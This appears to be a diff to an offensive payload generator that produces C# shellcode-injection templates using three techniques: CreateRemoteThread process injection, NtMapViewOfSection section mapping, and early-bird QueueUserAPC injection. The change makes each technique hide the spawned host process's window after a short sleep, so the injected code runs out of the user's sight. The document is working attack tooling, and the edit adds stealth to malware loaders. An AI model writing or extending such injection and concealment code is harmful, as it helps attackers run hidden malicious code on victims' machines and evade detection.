@@ -247,6 +247,7 @@ START_PROCESS_INJECT_IMPORT = f"""
     {PINVOKE["OpenProcess"]} 
     {PINVOKE["WriteProcessMemory"]} 
     {PINVOKE["CreateRemoteThread"]} 
+    {PINVOKE["ShowWindow"]}
 """
 
 START_SHELLCODE_IMPORT = f"""
@@ -285,6 +286,8 @@ START_PROCESS_INJECT = """
               IntPtr outSize;
               WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
               IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+              System.Threading.Thread.Sleep(100);
+              ShowWindow(proc.MainWindowHandle, 0);
             }
                proc.WaitForExit();
                // Retrieve the app's exit code
@@ -386,6 +389,7 @@ START_PROCESS_INTERPROCESS_IMPORT = f"""
   {PINVOKE["NtCreateSection"]}
   {PINVOKE["NtMapViewOfSection"]}
   {PINVOKE["RtlCreateUserThread"]}
+  {PINVOKE["ShowWindow"]}
 """ 
 START_PROCESS_INTERPROCESS_IMPORT += """
 
@@ -460,6 +464,8 @@ START_PROCESS_INTERPROCESS_CODE = """
               IntPtr hThread = IntPtr.Zero;
               CLIENT_ID cid = new CLIENT_ID();
               RtlCreateUserThread(target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
+              System.Threading.Thread.Sleep(100);
+              ShowWindow(proc.MainWindowHandle, 0);
               }
          }
 """
@@ -582,9 +588,10 @@ START_PROCESS_EARLYBIRD_CODE = """
   
               QueueUserAPC(VAlloc_address, Thread_handle, 0);
               ResumeThread(Thread_handle);
-              ShowWindow(proc.MainWindowHandle, 0);
               CloseHandle(Process_handle);
               CloseHandle(Thread_handle);
+              System.Threading.Thread.Sleep(100);
+              ShowWindow(proc.MainWindowHandle, 0);
             }
             }
 """
